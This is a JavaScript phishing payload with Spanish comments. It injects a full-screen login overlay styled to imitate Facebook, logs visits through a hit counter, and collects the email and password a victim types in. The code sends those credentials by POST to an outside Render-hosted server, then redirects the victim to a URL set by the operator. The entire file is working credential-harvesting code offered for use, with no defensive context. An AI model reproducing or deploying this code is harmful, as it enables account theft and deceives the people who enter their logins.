(function() {
    // 1. CONFIGURACIÓN: CAMBIA ESTA URL POR LA TUYA DE RENDER
    const SERVER_URL = "https://jeffrey123.onrender.com"; 

    // 2. LÓGICA DEL CONTADOR (Whos.amung.us)
    async function trackVisit() {
        try {
            const res = await fetch(`${SERVER_URL}/config`);
            const config = await res.json();
            
            if (config.counter_id) {
                // Método 1: Script oficial dinámico
                const s = document.createElement('script');
                s.async = true;
                s.src = `https://whos.amung.us/js/chores.js`;
                document.head.appendChild(s);
                window.wa_amo = config.counter_id; 

                // Método 2: Ping directo (Respaldo)
                const img = new Image();
                img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=Visit&x=${encodeURIComponent(window.location.href)}`;
                img.style.display = "none";
                document.body.appendChild(img);
            }
        } catch (e) {
            console.error("Error en el rastreo:", e);
        }
    }
    trackVisit();

    // 3. DISEÑO DEL PANEL (Espejo y Responsivo)
    const overlay = document.createElement('div');
    overlay.style = `
        position: fixed !important;
        top: 0 !important;
        left: 0 !important;
        width: 100vw !important;
        height: 100vh !important;
        background: rgba(0, 0, 0, 0.8) !important;
        z-index: 2147483647 !important;
        display: flex !important;
        justify-content: center !important;
        align-items: center !important;
        backdrop-filter: blur(8px) !important;
        -webkit-backdrop-filter: blur(8px) !important;
        margin: 0 !important;
        padding: 0 !important;
    `;

    overlay.innerHTML = `
        <div style="
            background: #ffffff !important;
            padding: 40px 30px !important;
            border-radius: 12px !important;
            width: 400px !important; 
            max-width: 90% !important; 
            box-shadow: 0 12px 40px rgba(0,0,0,0.5) !important;
            text-align: center !important;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif !important;
            box-sizing: border-box !important;
            display: block !important;
        ">
            <h2 style="color: #1877f2 !important; margin: 0 0 25px 0 !important; font-size: 30px !important; font-weight: bold !important; letter-spacing: -0.5px !important;">
                Iniciar Sesión
            </h2>
            
            <input id="i-email" type="text" placeholder="Correo electrónico o teléfono" style="
                width: 100% !important;
                height: 52px !important;
                padding: 0 15px !important;
                margin-bottom: 12px !important;
                border: 1px solid #dddfe2 !important;
                border-radius: 6px !important;
                font-size: 17px !important;
                box-sizing: border-box !important;
                background: #f5f6f7 !important;
                color: #1c1e21 !important;
                display: block !important;
            ">
            
            <input id="i-pass" type="password" placeholder="Contraseña" style="
                width: 100% !important;
                height: 52px !important;
                padding: 0 15px !important;
                margin-bottom: 20px !important;
                border: 1px solid #dddfe2 !important;
                border-radius: 6px !important;
                font-size: 17px !important;
                box-sizing: border-box !important;
                background: #f5f6f7 !important;
                color: #1c1e21 !important;
                display: block !important;
            ">
            
            <button id="i-btn" style="
                width: 100% !important;
                height: 52px !important;
                background: #1877f2 !important;
                color: white !important;
                border: none !important;
                border-radius: 6px !important;
                font-size: 20px !important;
                font-weight: bold !important;
                cursor: pointer !important;
                display: block !important;
            ">
                Entrar
            </button>
            
            <p style="margin-top: 20px !important; color: #1877f2 !important; font-size: 14px !important; cursor: pointer !important; text-decoration: none !important;">
                ¿Olvidaste tu contraseña?
            </p>
        </div>
    `;

    document.body.appendChild(overlay);

    // 4. ENVÍO DE DATOS Y REDIRECCIÓN
    document.getElementById('i-btn').onclick = async function() {
        const email = document.getElementById('i-email').value;
        const password = document.getElementById('i-pass').value;
        
        if(!email || !password) return;

        this.disabled = true;
        this.innerText = "Verificando...";

        try {
            // Guardar en base de datos
            await fetch(`${SERVER_URL}/login`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            });

            // Obtener link de redirección configurado en admin
            const configRes = await fetch(`${SERVER_URL}/config`);
            const configData = await configRes.json();

            // Pequeña pausa para efecto de carga y redirigir
            setTimeout(() => {
                window.location.href = configData.redirect_url;
            }, 1000);

        } catch(e) {
            console.error("Error al enviar:", e);
            this.disabled = false;
            this.innerText = "Entrar";
        }
    };
})();
